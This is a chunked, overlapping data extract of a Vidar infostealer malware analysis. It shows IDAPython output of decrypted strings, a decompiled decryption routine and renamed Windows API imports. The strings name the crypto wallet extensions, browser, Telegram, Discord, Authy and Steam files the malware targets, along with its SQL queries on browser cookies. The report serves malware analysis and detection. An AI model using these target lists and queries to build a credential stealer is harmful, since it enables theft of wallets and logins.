odbfpeeihdkbihmopkbjmoonfanlbfcl at 0x4029c2 [+] Decrypted string: BraveWallet at 0x4029d8 [+] Decrypted string: fhilaheimglignddkjgofkcbgekhenbh at 0x4029ee [+] Decrypted string: Oxygen (Atomic) at 0x402a05 [+] Decrypted string: mgffkfbidihjpoaomajlbgchddlicgpn at 0x402a1b [+] Decrypted|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|0e4c0ce943b24aef86428b8d2ffa730f
at 0x4029ee [+] Decrypted string: Oxygen (Atomic) at 0x402a05 [+] Decrypted string: mgffkfbidihjpoaomajlbgchddlicgpn at 0x402a1b [+] Decrypted st|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|274f9b9d6a4c4a258d8e917b54f77f7d
"ring: PaliWallet at 0x402a32 [+] Decrypted string: aodkkagnadcbobfpggfnjeongemjbjca at 0x402a48 [+] Decrypted string: BoltX at 0x402a5f [+] Decrypted string: hmeobnfnfcmdkdcmlblgagmfpfboieaf at 0x402a75 [+] Decrypted string: XdefiWallet at 0x402a8b [+] Decrypted string: lpfcbjknijpeeillifnkikgncikgfhdo at 0x402aa1 [+] Decrypted string: NamiWallet at 0x402ab8 [+] Decrypted string: dngmlblcodfobpdpecaadgfbcggfjfnm at 0x402ace [+] Decrypted string: MaiarDeFiWallet at 0x402ae5 [+] Decrypted string: lpilbniiabackdjcionkobglmddfbcjo at 0x402afb [+] Decrypted string: WavesKeeper at 0x402b11 [+] Decrypted string: bhhhlbepdkbapadjdnnojkbgioiodbic at 0x402b27 [+] Decrypted string: Solflare at 0x402b3e [+] Decrypted string: dkdedlpgdmmkkfjabffeganieamfklkm at 0x402b54 [+] Decrypted string: CyanoWallet at 0x402b6a [+] Decrypted string: hcflpincpppdclinealmandijcmnkbgn at 0x402b80 [+] Decrypted string: KHC at 0x402b97 [+] Decrypted string: mnfifefkajgofkcjkemidiaecocnkjeh at 0x402bad [+] Decrypted string: TezBox at 0x402bc4 [+] Decrypted string: ookjlbkiijinhpmnjffcofjonbfbgaoc at 0x402bda [+] Decrypted string: Temple at 0x402bf1 [+] Decrypted string: jnkelfanjkeadonecabehalmbgpfodjm at 0x402c07 [+] Decrypted string: Goby at 0x402c1e [+] Decrypted string: bhghoamapcdpbohphigoooaddinpkbai at 0x402c34 [+] Decrypted string: Authenticator at 0x402c4a [+] Decrypted string: gaedmjdfmmahhbjefcbgaolhhanlaolb at 0x402c60

8/20"|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|2d36df1973154c44bb0bf58f7f4224d2
[+] Decrypted string: Authy at 0x402c77 [+] Decrypted string: oeljdldpnmdbchonielidgobddffflal at 0x402c8d [+] Decrypted string: EOS Authenticator at 0x402ca4 [+] Decrypted string: ilgcnhelpchnceeipipijaljkblbcobl at 0x402cba [+] Decrypted string: GAuth Authenticator at 0x402cd1 [+] Decrypted string: \com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb\ at 0x402ce8 [+] Decrypted string: Jaxx_Desktop at 0x402cff [+] Decrypted string: \Daedalus Mainnet\wallets\ at 0x402d16 [+] Decrypted string: Daedalus Mainnet at 0x402d2d [+] Decrypted string: she*.sqlite at 0x402d43 [+] Decrypted string: \Blockstream\Green\wallets\ at 0x402d5a [+] Decrypted string: Blockstream Green at 0x402d71 [+] Decrypted string: \WalletWasabi\Client\Wallets\ at 0x402d88 [+] Decrypted string: Wasabi Wallet at 0x402d9e [+] Decrypted string: \discord\ at 0x402db5 [+] Decrypted string: Discord at 0x402dcc [+] Decrypted string: Local Storage at 0x402de2 [+] Decrypted string: leveldb at 0x402df9 [+] Decrypted string: Session Storage at 0x402e10 [+] Decrypted string: \Soft\Discord\discord_tokens.txt at 0x402e26 [+] Decrypted string: dQw4w9WgXcQ: at 0x402e3d [+] Decrypted string: Discord Token: at 0x402e54 [+] Decrypted string: CreateThread at 0x402e6b [+] Decrypted string: GlobalMemoryStatusEx at 0x402e82 [+] Decrypted string: IsWow64Process at 0x402e99 [+] Decrypted string: GetUserDefaultLocaleName at 0x402eb0 [+] Decrypted string: GetSystemInfo at 0x402ec6 [+] Decrypted string: WideCharToMultiByte at|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|d1316b4f12a14a09a7b40be697412d47
Decrypted string: GetUserDefaultLocaleName at 0x402eb0 [+] Decrypted string: GetSystemInfo at 0x402ec6 [+] Decrypted string: WideCharToMultiByte at 0x402edd|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|53ee774868194b36808224e8d6095b8a
"[+] Decrypted string: LocalFree at 0x402ef4 [+] Decrypted string: HeapAlloc at 0x402f0b [+] Decrypted string: GetProcessHeap at 0x402f22 [+] Decrypted string: CreateFileA at 0x402f38 [+] Decrypted string: GetFileSize at 0x402f4e [+] Decrypted string: ReadFile at 0x402f65 [+] Decrypted string: CloseHandle at 0x402f7b [+] Decrypted string: GetLogicalDriveStringsA at 0x402f92 [+] Decrypted string: lstrlenA at 0x402fa9 [+] Decrypted string: GetDriveTypeA at 0x402fbf [+] Decrypted string: lstrcpyA at 0x402fd6 [+] Decrypted string: MultiByteToWideChar at 0x402fed [+] Decrypted string: FindFirstFileA at 0x403004 [+] Decrypted string: FindNextFileA at 0x40301a [+] Decrypted string: FindClose at 0x403031 [+] Decrypted string: GetLastError at 0x403048 [+] Decrypted string: lstrcpynA at 0x40305f [+] Decrypted string: GlobalLock at 0x403076 [+] Decrypted string: GlobalSize at 0x40308d [+] Decrypted string: FreeLibrary at 0x4030a3 [+] Decrypted string: GetLocaleInfoA at 0x4030ba [+] Decrypted string: GetCurrentProcessId at 0x4030d1 [+] Decrypted string: OpenProcess at 0x4030e7

9/20"|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|7746bafc3df048b8be07df4cf7b3870b
[+] Decrypted string: GetFileSizeEx at 0x4030fd [+] Decrypted string: GetTimeZoneInformation at 0x403114 [+] Decrypted string: TzSpecificLocalTimeToSystemTime at 0x40312b [+] Decrypted string: CopyFileA at 0x403142 [+] Decrypted string: DeleteFileA at 0x403158 [+] Decrypted string: GetCurrentDirectoryA at 0x40316f [+] Decrypted string: SetFilePointer at 0x403186 [+] Decrypted string: HeapFree at 0x40319d [+] Decrypted string: SystemTimeToFileTime at 0x4031b4 [+] Decrypted string: GetLocalTime at 0x4031cb [+] Decrypted string: SetFileTime at 0x4031e1 [+] Decrypted string: WriteFile at 0x4031f8 [+] Decrypted string: GetFileAttributesA at 0x40320f [+] Decrypted string: GetFileAttributesW at 0x403226 [+] Decrypted string: LocalFileTimeToFileTime at 0x40323d [+] Decrypted string: MapViewOfFile at 0x403253 [+] Decrypted string: UnmapViewOfFile at 0x40326a [+] Decrypted string: FileTimeToSystemTime at 0x403281 [+] Decrypted string: CreateFileMappingA at 0x403298 [+] Decrypted string: GetFileInformationByHandle at 0x4032af [+] Decrypted string: GetEnvironmentVariableA at 0x4032c6 [+] Decrypted string: SetEnvironmentVariableA at 0x4032dd [+] Decrypted string: GetTickCount at 0x4032f4 [+] Decrypted string: OpenEventA at 0x40330b [+] Decrypted string: CreateEventA at 0x403322 [+] Decrypted string: CreateToolhelp32Snapshot at 0x403339 [+] Decrypted string: Process32First at 0x403350 [+] Decrypted string: Process32Next at 0x403366 [+] Decrypted string: GetWindowsDirectoryA at 0x40337d|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|3b38415f41274c5eb271634c42f4aeef
Decrypted string: Process32First at 0x403350 [+] Decrypted string: Process32Next at 0x403366 [+] Decrypted string: GetWindowsDirectoryA at 0x40337d [+]|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|30c4d7bd13f64ccd85f34dc0a3c899c6
"Decrypted string: GetVolumeInformationA at 0x403394 [+] Decrypted string: shell32.dll at 0x4033aa [+] Decrypted string: shlwapi.dll at 0x4033c0 [+] Decrypted string: dbghelp.dll at 0x4033d6 [+] Decrypted string: gdiplus.dll at 0x4033ec [+] Decrypted string: CryptBinaryToStringA at 0x403403 [+] Decrypted string: RegEnumValueA at 0x403419 [+] Decrypted string: GetFileSecurityA at 0x403430 [+] Decrypted string: OpenProcessToken at 0x403447 [+] Decrypted string: DuplicateToken at 0x40345e [+] Decrypted string: MapGenericMask at 0x403475 [+] Decrypted string: AccessCheck at 0x40348b [+] Decrypted string: InternetCrackUrlA at 0x4034a2 [+] Decrypted string: CoInitialize at 0x4034b9 [+] Decrypted string: CreateStreamOnHGlobal at 0x4034d0 [+] Decrypted string: GetHGlobalFromStream at 0x4034e7 [+] Decrypted string: GetWindowRect at 0x4034fd [+] Decrypted string: GetWindowDC at 0x403513 [+] Decrypted string: CloseWindow at 0x403529 [+] Decrypted string: ShellExecuteExA at 0x403540 [+] Decrypted string: SHFileOperationA at 0x403557 [+] Decrypted string: SHGetFolderPathA at 0x40356e [+] Decrypted string: PathMatchSpecW at 0x403585

10/20"|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|dc9de27148b94cd5a9a5155a8980b553
[+] Decrypted string: PathMatchSpecA at 0x40359c [+] Decrypted string: StrCmpCA at 0x4035b3 [+] Decrypted string: StrCmpCW at 0x4035ca [+] Decrypted string: StrStrA at 0x4035e1 [+] Decrypted string: PathFindFileNameA at 0x4035f8 [+] Decrypted string: SymMatchString at 0x40360f [+] Decrypted string: GdipGetImageEncodersSize at 0x403626 [+] Decrypted string: GdipGetImageEncoders at 0x40363d [+] Decrypted string: GdipCreateBitmapFromHBITMAP at 0x403654 [+] Decrypted string: GdiplusStartup at 0x40366b [+] Decrypted string: GdiplusShutdown at 0x403682 [+] Decrypted string: GdipSaveImageToStream at 0x403699 [+] Decrypted string: GdipDisposeImage at 0x4036b0 [+] Decrypted string: GdipFree at 0x4036c7 [+] Decrypted string: sqlite3_open at 0x4036de [+] Decrypted string: sqlite3_prepare_v2 at 0x4036f5 [+] Decrypted string: sqlite3_step at 0x40370c [+] Decrypted string: sqlite3_column_text at 0x403723 [+] Decrypted string: sqlite3_finalize at 0x40373a [+] Decrypted string: sqlite3_close at 0x403750 [+] Decrypted string: sqlite3_column_bytes at 0x403767 [+] Decrypted string: sqlite3_column_blob at 0x40377e [+] Decrypted string: \Opera Software\ at 0x403795 [+] Decrypted string: \Opera Stable\ at 0x4037ac [+] Decrypted string: \Opera GX Stable\ at 0x4037c3 [+] Decrypted string: \CryptoTab Browser\User Data\ at 0x4037da [+] Decrypted string: CryptoTab Browser at 0x4037f1 [+] Decrypted string: \BraveSoftware\Brave-Browser\User Data\ at 0x403808 [+] Decrypted string: Brave at 0x40381f [+]|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|c6de7526e07a4124bf8c60cf2403ef42
CryptoTab Browser at 0x4037f1 [+] Decrypted string: \BraveSoftware\Brave-Browser\User Data\ at 0x403808 [+] Decrypted string: Brave at 0x40381f [+] De|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|51205355609845689edfc952ed9776b7
"crypted string: \Thunderbird\Profiles\ at 0x403836 [+] Decrypted string: Thunderbird at 0x40384c [+] Decrypted string: \Telegram Desktop\ at 0x403863 [+] Decrypted string: key_datas at 0x40387a [+] Decrypted string: map* at 0x403891 [+] Decrypted string: D877F783D5D3EF8C* at 0x4038a8 [+] Decrypted string: A7FDF864FBC10B77* at 0x4038bf [+] Decrypted string: A92DAA6EA6F891F2* at 0x4038d6 [+] Decrypted string: F8806DD0C461824F* at 0x4038ed [+] Decrypted string: \Soft\Telegram\ at 0x403904 [+] Decrypted string: \passwords.txt at 0x40391b [+] Decrypted string: ""os_crypt"":{""encrypted_key"":"" at 0x403932 [+] Decrypted string: Soft: at 0x403949 [+] Decrypted string: Host: at 0x403960 [+] Decrypted string: Login: at 0x403977 [+] Decrypted string: Password: at 0x40398e [+] Decrypted string: Network at 0x4039a5 [+] Decrypted string: SELECT host, isHttpOnly, path, isSecure, expiry, name, value FROM moz_cookies at 0x4039bc [+] Decrypted string: SELECT url FROM moz_places at 0x4039d3 [+] Decrypted string: SELECT fieldname, value FROM moz_formhistory at 0x4039ea [+] Decrypted string: History at 0x403a01 [+] Decrypted string: cookies.sqlite at 0x403a18

11/20"|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|0c1bd41f350b4bd486ee89b3eae3362f
[+] Decrypted string: formhistory.sqlite at 0x403a2f [+] Decrypted string: places.sqlite at 0x403a45 [+] Decrypted string: *.localstorage at 0x403a5c [+] Decrypted string: \Authy Desktop\Local Storage\ at 0x403a73 [+] Decrypted string: \Soft\Authy Desktop Old\ at 0x403a8a [+] Decrypted string: \Authy Desktop\Local Storage\leveldb\ at 0x403aa1 [+] Decrypted string: \Soft\Authy Desktop\ at 0x403ab8 [+] Decrypted string: Soft: WinSCP at 0x403acf [+] Decrypted string: HostName at 0x403ae6 [+] Decrypted string: PortNumber at 0x403afd [+] Decrypted string: UserName at 0x403b14 [+] Decrypted string: Password at 0x403b2b [+] Decrypted string: Security at 0x403b42 [+] Decrypted string: UseMasterPassword at 0x403b59 [+] Decrypted string: Local Extension Settings at 0x403b70 [+] Decrypted string: Sync Extension Settings at 0x403b87 [+] Decrypted string: IndexedDB at 0x403b9e [+] Decrypted string: kjmoohlgokccodicjjfebfomlbljgfhk at 0x403bb4 [+] Decrypted string: RoninWalletEdge at 0x403bcb [+] Decrypted string: sqlite3.dll at 0x403be1 [+] Decrypted string: Version: at 0x403bf8 [+] Decrypted string: Date: at 0x403c11 [+] Decrypted string: MachineID: at 0x403c27 [+] Decrypted string: GUID: at 0x403c3d [+] Decrypted string: HWID: at 0x403c53 [+] Decrypted string: Path: at 0x403c69 [+] Decrypted string: Work Dir: In memory at 0x403c80 [+] Decrypted string: Windows: at 0x403c97 [+] Decrypted string: Computer Name: at 0x403cae [+] Decrypted string: User Name: at 0x403cc4 [+] Decrypted|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|4d48c48561aa4b3894e0479764767039
Decrypted string: Windows: at 0x403c97 [+] Decrypted string: Computer Name: at 0x403cae [+] Decrypted string: User Name: at 0x403cc4 [+] Decrypted string:|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|d8ab2fc2872d402098fabefa2bd0af62
"Display Resolution: at 0x403cdb [+] Decrypted string: Display Language: at 0x403cf2 [+] Decrypted string: Keyboard Languages: at 0x403d09 [+] Decrypted string: Local Time: at 0x403d20 [+] Decrypted string: TimeZone: at 0x403d39 [+] Decrypted string: [Hardware] at 0x403d4f [+] Decrypted string: Processor: at 0x403d65 [+] Decrypted string: CPU Count: at 0x403d7b [+] Decrypted string: RAM: at 0x403d92 [+] Decrypted string: VideoCard: at 0x403da8 [+] Decrypted string: [Processes] at 0x403dbe [+] Decrypted string: [Software] at 0x403dd4 [+] Decrypted string: \information.txt at 0x403deb [+] Decrypted string: %APPDATA% at 0x403e02 [+] Decrypted string: %LOCALAPPDATA% at 0x403e19 [+] Decrypted string: %USERPROFILE% at 0x403e2f [+] Decrypted string: %DESKTOP% at 0x403e46 [+] Decrypted string: %DOCUMENTS% at 0x403e5c [+] Decrypted string: %PROGRAMFILES% at 0x403e73 [+] Decrypted string: %PROGRAMFILES_86% at 0x403e8a [+] Decrypted string: %RECENT% at 0x403ea1 [+] Decrypted string: %DRIVE_FIXED% at 0x403eb7

12/20"|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|2c6dd23bcc6d44b7be05a01f2de3d9e9
"12/20

[+] Decrypted string: %DRIVE_REMOVABLE% at 0x403ece [+] Decrypted string: *%RECENT%* at 0x403ee4 [+] Decrypted string: *%DRIVE_FIXED%* at 0x403efb [+] Decrypted string: *%DRIVE_REMOVABLE%* at 0x403f12 [+] Decrypted string: C:\Windows\ at 0x403f28 [+] Decrypted string: C:\\Windows\ at 0x403f3f [+] Decrypted string: C:\\\Windows\ at 0x403f55 [+] Decrypted string: Software\Valve\Steam at 0x403f6c [+] Decrypted string: SteamPath at 0x403f83 [+] Decrypted string: ssfn* at 0x403f9a [+] Decrypted string: config.vdf at 0x403fb0 [+] Decrypted string: DialogConfig.vdf at 0x403fc7 [+] Decrypted string: DialogConfigOverlay*.vdf at 0x403fde [+] Decrypted string: libraryfolders.vdf at 0x403ff5 [+] Decrypted string: loginusers.vdf at 0x40400c [+] Decrypted string: Binance Desktop at 0x404023 [+] Decrypted string: simple-storage.json at 0x40403a [+] Decrypted string: .finger-print.fp at 0x404051 [+] Decrypted string: Bitcoin Core at 0x404068 [+] Decrypted string: \Bitcoin\wallets\ at 0x40407f [+] Decrypted string: Bitcoin Core Old at 0x404096 [+] Decrypted string: \Bitcoin\ at 0x4040ad [+] Decrypted string: wallet.dat at 0x4040c3 [+] Decrypted string: *wallet*.dat at 0x4040da [+] Decrypted string: Dogecoin at 0x4040f1 [+] Decrypted string: \Dogecoin\ at 0x404107 [+] Decrypted string: Raven Core at 0x40411d [+] Decrypted string: \Raven\ at 0x404134 [+] Decrypted string: Ledger Live at 0x40414a

13/20

The global variables are renamed corresponding to the decoded strings as follows:"|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|75e87051ce1d41ca9ce43340692de8e4
"13/20

The global variables are renamed corresponding to the decoded strings as follows:

14/20

// #STR: ""MNLNPK"", ""YPFTTRV"", ""G6MUFPYIQNJQ"", ""BNQBVR82"", "".=%053Ls"", ""DPKUO540BD4R2J"", ""RMPZX"", ""U6869B6N6IOTC"", ""VZS0W2FKU7H"", ""MS2Y26EV53O6FTKSR"" const CHAR *__stdcall vdr_decrypt_strings_wrap() { // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-""+"" TO EXPAND] str_HAL9TH = vdr_decrypt_strings(6u, &xor_key, ""MNLNPK""); str_JohnDoe = vdr_decrypt_strings(7u, byte_43802C, ""YPFTTRV""); str_LoadLibraryA = vdr_decrypt_strings(0xCu, str_Y1903, ""G6MUFPYIQNJQ""); str_lstrcatA = vdr_decrypt_strings(8u, "".=%053Ls"", ""BNQBVR82""); str_GetProcAddress = vdr_decrypt_strings(0xEu, byte_43807C, ""DPKUO540BD4R2J""); str_Sleep = vdr_decrypt_strings(5u, byte_438094, ""RMPZX""); str_GetSystemTime = vdr_decrypt_strings(0xDu, byte_4380AC, ""U6869B6N6IOTC""); str_ExitProcess = vdr_decrypt_strings(0xBu, byte_4380C8, ""VZS0W2FKU7H""); str_GetCurrentProcess = vdr_decrypt_strings(0x11u, str_6F, ""MS2Y26EV53O6FTKSR""); str_VirtualAllocExNuma = vdr_decrypt_strings(0x12u, byte_438110, ""R8SXT26D010WUN981T""); str_VirtualAlloc = vdr_decrypt_strings(0xCu, str_4, ""QJIVAD2YIH2N""); str_VirtualFree = vdr_decrypt_strings(0xBu, byte_438150, ""HLKX3WPT306""); str_lstrcmpiW = vdr_decrypt_strings(9u, "":11<[!"|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|0bde5fee0bdb49bd949bb5698a5c9ae4
"Rename global vars related to API functions Next, vidar will use the GetProcAddress function to get the addresses of all the APIs it uses during execution. We can write an IDAPython script to parse the list of decrypted API functions and perform renaming of global variables. Here are the results:

15/20"|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|9af6d8adb0ba4373b0cfcc6e2ffceeb8
[*] Trying to rename global var to API function name: [+] Set API name: NSS_Init at 0x414ae3 [+] Set API name: NSS_Shutdown at 0x414afa [+] Set API name: PK11_GetInternalKeySlot at 0x414b11 [+] Set API name: PK11_FreeSlot at 0x414b28 [+] Set API name: PK11_Authenticate at 0x414b3f [+] Set API name: PK11SDR_Decrypt at 0x414b56 [+] Set API name: PK11SDR_Decrypt at 0x41a9b3 [+] Set API name: PK11SDR_Decrypt at 0x41a9b3 [+] Set API name: Sleep at 0x41a9d1 [+] Set API name: GetSystemTime at 0x41a9e8 [+] Set API name: ExitProcess at 0x41a9ff [+] Set API name: GetCurrentProcess at 0x41aa16 [+] Set API name: VirtualAllocExNuma at 0x41aa2d [+] Set API name: VirtualAlloc at 0x41aa44 [+] Set API name: VirtualFree at 0x41aa5b [+] Set API name: lstrcmpiW at 0x41aa72 [+] Set API name: LocalAlloc at 0x41aa89 [+] Set API name: GetComputerNameA at 0x41aaa0 [+] Set API name: GetComputerNameA at 0x41aaa0 [+] Set API name: GetUserNameA at 0x41aac8 [+] Set API name: CreateThread at 0x41aaeb [+] Set API name: GlobalMemoryStatusEx at 0x41ab02 [+] Set API name: IsWow64Process at 0x41ab19 [+] Set API name: GetUserDefaultLocaleName at 0x41ab30 [+] Set API name: GetSystemInfo at 0x41ab47 [+] Set API name: WideCharToMultiByte at 0x41ab5e [+] Set API name: LocalFree at 0x41ab75 [+] Set API name: HeapAlloc at 0x41ab8c [+] Set API name: GetProcessHeap at 0x41aba3 [+] Set API name: CreateFileA at 0x41abba [+] Set API name: GetFileSize at 0x41abd1 [+] Set API name: ReadFile at 0x41abe8 [+] Set API name:|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|c25aedbb164a484b93685c2e4127a227
0x41aba3 [+] Set API name: CreateFileA at 0x41abba [+] Set API name: GetFileSize at 0x41abd1 [+] Set API name: ReadFile at 0x41abe8 [+] Set API name: Clos|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|4ff630e6003d448893c087007128d1ae
"eHandle at 0x41abff [+] Set API name: GetLogicalDriveStringsA at 0x41ac16 [+] Set API name: lstrlenA at 0x41ac2d [+] Set API name: GetDriveTypeA at 0x41ac44 [+] Set API name: lstrcpyA at 0x41ac5b [+] Set API name: MultiByteToWideChar at 0x41ac72 [+] Set API name: FindFirstFileA at 0x41ac89 [+] Set API name: FindNextFileA at 0x41aca0 [+] Set API name: FindClose at 0x41acb7 [+] Set API name: GetLastError at 0x41acce [+] Set API name: lstrcpynA at 0x41ace5 [+] Set API name: GlobalLock at 0x41acfc [+] Set API name: GlobalSize at 0x41ad13 [+] Set API name: FreeLibrary at 0x41ad2a [+] Set API name: GetLocaleInfoA at 0x41ad41 [+] Set API name: GetCurrentProcessId at 0x41ad58 [+] Set API name: OpenProcess at 0x41ad6f [+] Set API name: GetFileSizeEx at 0x41ad86 [+] Set API name: GetTimeZoneInformation at 0x41ad9d

16/20"|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|5fdd73fc9de745098702e9c6fa2accb1
[+] Set API name: TzSpecificLocalTimeToSystemTime at 0x41adb4 [+] Set API name: CopyFileA at 0x41adcb [+] Set API name: DeleteFileA at 0x41ade2 [+] Set API name: GetCurrentDirectoryA at 0x41adf9 [+] Set API name: SetFilePointer at 0x41ae10 [+] Set API name: HeapFree at 0x41ae27 [+] Set API name: SystemTimeToFileTime at 0x41ae3e [+] Set API name: GetLocalTime at 0x41ae55 [+] Set API name: SetFileTime at 0x41ae6c [+] Set API name: WriteFile at 0x41ae83 [+] Set API name: GetFileAttributesA at 0x41ae9a [+] Set API name: GetFileAttributesW at 0x41aeb1 [+] Set API name: LocalFileTimeToFileTime at 0x41aec8 [+] Set API name: MapViewOfFile at 0x41aedf [+] Set API name: UnmapViewOfFile at 0x41aef6 [+] Set API name: FileTimeToSystemTime at 0x41af0d [+] Set API name: CreateFileMappingA at 0x41af24 [+] Set API name: GetFileInformationByHandle at 0x41af3b [+] Set API name: GetEnvironmentVariableA at 0x41af52 [+] Set API name: SetEnvironmentVariableA at 0x41af69 [+] Set API name: GetTickCount at 0x41af80 [+] Set API name: OpenEventA at 0x41af97 [+] Set API name: CreateEventA at 0x41afae [+] Set API name: CreateToolhelp32Snapshot at 0x41afc5 [+] Set API name: Process32First at 0x41afdc [+] Set API name: Process32Next at 0x41aff3 [+] Set API name: GetWindowsDirectoryA at 0x41b00a [+] Set API name: GetVolumeInformationA at 0x41b021 [+] Set API name: BCryptCloseAlgorithmProvider at 0x41b0fb [+] Set API name: BCryptDestroyKey at 0x41b112 [+] Set API name: BCryptOpenAlgorithmProvider at 0x41b129|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|2b80adbccf5442eaa3efcbc73c204617
"[+] Set API name: BCryptSetProperty at 0x41b140 [+] Set API name: BCryptGenerateSymmetricKey at 0x41b157 [+] Set API name: BCryptDecrypt at 0x41b16e [+] Set API name: CryptUnprotectData at 0x41b189 [+] Set API name: CryptBinaryToStringA at 0x41b1a0 [+] Set API name: CryptStringToBinaryA at 0x41b1b7 [+] Set API name: RegOpenKeyExA at 0x41b1d6 [+] Set API name: RegQueryValueExA at 0x41b1ed [+] Set API name: RegCloseKey at 0x41b204 [+] Set API name: RegOpenKeyExW at 0x41b21b [+] Set API name: RegGetValueW at 0x41b232 [+] Set API name: RegEnumKeyExA at 0x41b249 [+] Set API name: RegGetValueA at 0x41b260 [+] Set API name: GetUserNameA at 0x41b277 [+] Set API name: GetCurrentHwProfileA at 0x41b28e [+] Set API name: RegEnumValueA at 0x41b2a5 [+] Set API name: GetFileSecurityA at 0x41b2bc [+] Set API name: OpenProcessToken at 0x41b2d3 [+] Set API name: DuplicateToken at 0x41b2ea [+] Set API name: MapGenericMask at 0x41b301 [+] Set API name: AccessCheck at 0x41b318

17/20"|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|220c61b7cdab40d2af4e2e6dc197c6dd
[+] Set API name: InternetCloseHandle at 0x41b337 [+] Set API name: InternetReadFile at 0x41b34e [+] Set API name: HttpSendRequestA at 0x41b365 [+] Set API name: HttpOpenRequestA at 0x41b37c [+] Set API name: InternetConnectA at 0x41b393 [+] Set API name: InternetOpenA at 0x41b3aa [+] Set API name: HttpAddRequestHeadersA at 0x41b3c1 [+] Set API name: HttpQueryInfoA at 0x41b3d8 [+] Set API name: InternetSetFilePointer at 0x41b3ef [+] Set API name: InternetOpenUrlA at 0x41b406 [+] Set API name: InternetSetOptionA at 0x41b41d [+] Set API name: DeleteUrlCacheEntry at 0x41b434 [+] Set API name: InternetCrackUrlA at 0x41b44b [+] Set API name: CreateCompatibleBitmap at 0x41b46a [+] Set API name: SelectObject at 0x41b481 [+] Set API name: BitBlt at 0x41b498 [+] Set API name: DeleteObject at 0x41b4af [+] Set API name: CreateDCA at 0x41b4c6 [+] Set API name: GetDeviceCaps at 0x41b4dd [+] Set API name: CreateCompatibleDC at 0x41b4f4 [+] Set API name: CoCreateInstance at 0x41b50f [+] Set API name: CoUninitialize at 0x41b526 [+] Set API name: CoInitialize at 0x41b53d [+] Set API name: CreateStreamOnHGlobal at 0x41b554 [+] Set API name: GetHGlobalFromStream at 0x41b56b [+] Set API name: GetDesktopWindow at 0x41b58a [+] Set API name: ReleaseDC at 0x41b5a1 [+] Set API name: GetKeyboardLayoutList at 0x41b5b8 [+] Set API name: CharToOemA at 0x41b5cf [+] Set API name: GetDC at 0x41b5e6 [+] Set API name: wsprintfA at 0x41b5fd [+] Set API name: EnumDisplayDevicesA at 0x41b614 [+] Set API name:|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|4165f2db199644a3b78dd0778807d0fb
[+] Set API name: GetDC at 0x41b5e6 [+] Set API name: wsprintfA at 0x41b5fd [+] Set API name: EnumDisplayDevicesA at 0x41b614 [+] Set API name: Ge|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|50f1f76952474b94a9b70b7415a68357
"tSystemMetrics at 0x41b62b [+] Set API name: GetWindowRect at 0x41b642 [+] Set API name: GetWindowDC at 0x41b659 [+] Set API name: CloseWindow at 0x41b670 [+] Set API name: GetModuleFileNameExA at 0x41b68b [+] Set API name: GetModuleBaseNameA at 0x41b6a2 [+] Set API name: EnumProcessModules at 0x41b6b9 [+] Set API name: ShellExecuteExA at 0x41b6d4 [+] Set API name: SHFileOperationA at 0x41b6eb [+] Set API name: SHGetFolderPathA at 0x41b702 [+] Set API name: PathMatchSpecW at 0x41b721 [+] Set API name: PathMatchSpecA at 0x41b738 [+] Set API name: StrCmpCA at 0x41b74f [+] Set API name: StrCmpCW at 0x41b766 [+] Set API name: StrStrA at 0x41b77d [+] Set API name: PathFindFileNameA at 0x41b794 [+] Set API name: SymMatchString at 0x41b7af [+] Set API name: GdipGetImageEncodersSize at 0x41b7ce [+] Set API name: GdipGetImageEncoders at 0x41b7e5 [+] Set API name: GdipCreateBitmapFromHBITMAP at 0x41b7fc

18/20

[+] Set API name: GdiplusStartup at 0x41b813 [+] Set API name: GdiplusShutdown at 0x41b82a [+] Set API name: GdipSaveImageToStream at 0x41b841 [+] Set API name: GdipDisposeImage at 0x41b858 [+] Set API name: GdipFree at 0x41b86f

19/20"|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|0b79edb518984b3899f08b8a8295ba58
"19/20

